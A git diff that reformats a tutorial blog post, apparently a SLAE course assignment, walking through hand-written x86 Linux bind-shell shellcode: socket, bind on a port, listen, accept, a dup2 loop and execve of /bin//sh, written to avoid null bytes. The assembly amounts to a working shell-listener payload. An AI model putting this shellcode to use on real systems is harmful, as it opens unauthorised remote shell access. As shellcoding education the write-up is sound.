@@ -91,12 +91,12 @@ Let's begin.
 
 Before we start, a quick rundown on how assembly uses registers for systemcalls.
 
-EAX - will be used for the system call number. Once the system call is executed the return value is also stored here.
-EBX - will be used for the 1st Argument.
-ECX - will be used for the 2nd Argument.
-EDX - 3rd.
-ESI - 4th.
-EDI - 5th.
+- EAX will be used for the system call number. Once the system call is executed the return value is also stored here.
+- EBX - will be used for the 1st Argument.
+- ECX - will be used for the 2nd Argument.
+- EDX - 3rd.
+- ESI - 4th.
+- EDI - 5th.
 
 Now that's covered, let's dive in. 
 
@@ -124,7 +124,7 @@ We will need to use three registers to accomplish this.
 
 First we will need to zero out these registers by XOR'ing them with themselves. This ensures the registers are in a clean state for usage.
 
-```asm
+```nasm
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
@@ -134,16 +134,17 @@ Next we need to put the syscall for socketcall in EAX. To do this we first need 
 
 There are many tools to do this, we can do this easily with python.
 
+```
 absolomb@ubuntu:~/SLAE/assignments/1$ python3
 Python 3.4.3 (default, Oct 14 2015, 20:33:09) 
 [GCC 4.8.4] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> hex(102)
 '0x66'
-
+```
 To avoid nulls we will MOV 0x66 into AL rather than into EAX directly.
 
-```
+```nasm
 mov al, 0x66
 ```
 
@@ -162,7 +163,7 @@ absolomb@ubuntu:~/SLAE/assignments/1$ cat /usr/include/linux/net.h
 
 We'll need 1 to create our socket, which means we can MOV that into BL, again avoiding nulls. 
 
-```asm
+```nasm
 mov bl, 0x1
 ```
 
@@ -170,7 +171,7 @@ Now for the last part we'll need to have AF_INET, SOCK_STREAM, 0 as all one argu
 
 Since ECX was zeroed out earlier we can simply do a PUSH to get our first argument of 0 onto the stack.
 
-```asm
+```nasm
 push ecx
 ```
 
@@ -184,7 +185,7 @@ absolomb@ubuntu:~/SLAE/assignments/1$ cat /usr/src/linux-headers-4.4.0-31/includ
 
 Since EBX is already set to 1 we can simply push its value to the stack
 
-```asm
+```nasm
 push ebx
 ```
 
@@ -192,20 +193,20 @@ Now for the last argument AF_INET,  we can take a look at /usr/include/i386-linu
 
 What we see is that AF_INET is mapped to PF_INET which has a value of 2.
 
-```asm
+```nasm
 push 0x2
 ```
 
 Now we point ECX to the top of the stack and call the systemcall interrupt executing all of our arguments
 
-```asm
+```nasm
 mov ecx, esp
 int 0x80
 ```
 
 As we know, EAX will now store the return value for our socket. Since we'll need to reuse EAX for the other system calls we'll need to preserve our socket elsewhere. We can dothis by MOV'ing it to EDI.
 
-```asm
+```nasm
 mov edi, eax
 ```  
 
@@ -247,21 +248,21 @@ And we already know from earlier AF_NET is 2.
 
 Since we need a 0 for our first argument to PUSH, we'll start by XOR'ing out EDX, which we haven't used yet. Then PUSH it to the stack.
 
-```asm
+```nasm
 xor edx, edx
 push edx
 ```
 
 Next we'll push our port number to the stack. And since EBX already contains a 2, we can go ahead and push that.
 
-```asm
+```nasm
 push word 0x3930
 push bx
 ```
 
 Now with our arguments setup correctly on the stack we can point ECX to the stack.
 
-```asm
+```nasm
 mov ecx, esp
 ```
 
@@ -269,7 +270,7 @@ With our struct in place now we are ready to pass the bind arguments which will 
 
 The size of our struct is 16 (0x10) so we'll push that to stack. We'll also push the value of ECX since it's currently pointing at the struct located on the stack. Finally we push our socket, and then point ECX to the top of the stack with all the arguments ready to be executed.
 
-```asm
+```nasm
 push 0x10
 push ecx
 push edi
@@ -278,7 +279,7 @@ int 0x80
 ```
 After we execute the bind we go ahead and clear out EAX for use in the next step.
 
-```asm
+```nasm
 xor eax, eax
 ```
 
@@ -288,7 +289,7 @@ Once again we'll be using socketcall(), this time with the SYS_LISTEN option (4)
 
 Currently EAX contains 0, so we'll PUSH that along with our socket still stored in EDI.
 
-```asm
+```nasm
 push eax
 push edi
 mov ecx, esp
@@ -296,7 +297,7 @@ mov ecx, esp
 
 Now the arguments are setup on the stack, we will need to store 4 in EBX and 0x66 for our socketcall in EAX. Since EBX is currently set to 2, we can simply increment it twice. Again, we'll need to MOV 0x66 into AL.
 
-```asm
+```nasm
 inc ebx
 inc ebx
 mov al, 0x66
@@ -313,7 +314,7 @@ accept(host_sock, NULL, NULL);
 
 First things first, let's setup the stack by pushing two 0's. To avoid nulls in the shellcode we'll XOR EDX with itself and then PUSH it twice to the stack.
 
-```asm
+```nasm
 xor edx, edx
 push edx
 push edx
@@ -321,7 +322,7 @@ push edx
 
 Next we'll push our socketfd to the stack from EDI. We also know that SYS_ACCEPT is defined as 5. EBX is already at 4, so we can do another increment here. The rest should be self-explanatory by now. 
 
-```asm
+```nasm
 push edi
 inc ebx
 mov ecx, esp
@@ -342,7 +343,7 @@ We can iterate over each file descriptor (0,1,2) by using a loop to make things 
 
 First we'll need to setup our counter in the counter register (ECX).
 
-```asm
+```nasm
 xor ecx, ecx
 mov cl, 0x2
 ```
@@ -351,7 +352,7 @@ Now comes the actual loop. We'll be using the JNS instruction which basically me
 
 We'll also need the dup2() system call number. Which we can find in `/usr/include/i386-linux-gnu/asm/unistd_32.h` as 63. Converted to hex that gives us 0x3f. 
 
-```asm
+```nasm
 loop:
 	mov al, 0x3f
 	int 0x80
@@ -390,7 +391,7 @@ b'6e69622f'
 ```
 First we push a null to the stack, then push our /bin//sh hex. The point ebx to the stack, null out the ECX register, move the execve syscall into EAX, and finally execute. 
 
-```asm
+```nasm
 push edx
 push 0x68732f2f
 push 0x6e69622f
@@ -402,7 +403,7 @@ int 0x80
 
 ## Final Assembly Code
 
-```asm
+```nasm
 global _start
 
 section .text
